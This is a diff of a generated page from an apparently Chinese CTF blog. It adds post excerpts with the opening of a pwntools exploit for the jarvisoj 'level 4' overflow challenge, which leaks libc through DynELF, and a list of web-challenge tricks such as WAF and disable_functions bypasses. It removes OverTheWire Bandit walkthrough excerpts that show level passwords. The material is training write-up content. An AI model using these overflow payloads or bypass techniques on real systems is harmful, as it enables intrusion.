@@ -35,7 +35,8 @@
   <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >
 
 
-<meta name="generator" content="Hexo 4.1.1"></head>
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
 
 
 <body>
@@ -135,6 +136,71 @@
               <div class="col-12 col-md-10 m-auto">
                 
 
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/30/jarvisoj-pwn-level-2/">
+        <p class="h4 index-header">jarvisoj pwn level 4</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">level 4checksec 是x86的题目用IDA打开没有libc文件，通过查询知道了一个DynELF，可以泄露出libc从哪里开始的。下面是EXP：
+from pwn import *
+
+re = remote(&quot;pwn2.jarvisoj.com&quot;,9880)
+elf = ELF(&#39;./level4&#39;)
+write_plt = elf.symbols[&#39;write&#39;]
+vul_addr=0x804844b
+bss_addr=0x0804a024
+
+def leak(address):
+        payload = &#39;a&#39;*0x88 + &#39;a&#39;*4 + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)
+        re.sendline(payload)
+        data = re.recv(4)
+        return data
+wow = DynELF(leak,elf=elf)
+system</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-30&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/27/CTF-web%E8%80%83%E7%82%B9/">
+        <p class="h4 index-header">CTF web考点</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">WEB常见出题套路1.爆破：包括爆破md5、爆破随机数、验证码识别等；2.绕WAF：包括花式绕MySQL、绕文件读取关键字检测之类的拦截3.花式玩弄几个PHP特性：包括弱类型，反序列化+destruct、\0截断、iconv截断；4.密码题：包括hash长度扩展、异或、移位加密各种变形、32位随机数过小、随机数种子可预测等；5.各种找源码技巧，包括git、svn、xxx.php.swp、www.(zip|tar.gz|rar|7z)、xxx.php.bak；6.文件上传：包括花式文件后缀.php345、inc、phtml、phpt、phps、各种文件内容检测&lt;?php &lt;? &lt;%；、花式解析漏洞；7.MySQL类型差异：包括和PHP弱类型类似的特性，0x、0b、0e之类，varchar和integer相关转换，非strict模式截断等；8.open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、Directorylterator及各种二进制选手插足的方法；9.条件竞争：包括竞争删除前生成shell、竞</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-27&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
 
   <div class="row mb-4 mx-auto">
     
@@ -501,116 +567,11 @@ int main(){
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/">
-        <p class="h4 index-header">overthewire解题（二）</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">level 13用账号：bandit13，密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL进入本关
-    bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
-    Could not create directory &#39;/home/bandit13/.ssh&#39;.
-    The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
-    ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
-    Are you sure you want to continue connecting (yes/no)? yes
-    Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_h</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/pwn">pwn</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/pwn">pwn</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/">
-        <p class="h4 index-header">overthewire解题（一）</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">level 0直接lscat readme
-level 1pwd
-cat ./.-
-level 2关于转义字符可以用反斜杠进行转义。也可以用tab键。
-
-level 3这里将文件进行了隐藏直接用find找到了隐藏文件。密码
-
-
-
-pIwrPrtPN36QITSp3EQaw936yaFoFgAB
-
-
-
-level 4这题很简单，直接一个一个文件读取就行了密码：
-
-
-
-koReBOKuIDDepwhWk7jZC0RTdopnAYKh
-
-
-
-level 5按照笨方法应该已经不能用了“ls -l”除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出，发现有很多文件夹，”find . -type f -size 1033c”，”.”查找当前目录以及子目录，-type f指定文件类型为普通文件，-size 1033c指定文件大小为 1033 bytes.密码：
-
-
-
-DXjZPULLxYr17uwoI01bNLQbtFemEgo7
-
-
-
-level 6grep（global search regular expression(RE) and print out the line，全面搜</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-12&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/pwn">pwn</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/pwn">pwn</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <a class="extend prev" rel="prev" href="/page/2/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fas fa-angle-double-right"></i></a>
+      <a class="extend prev" rel="prev" href="/page/2/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
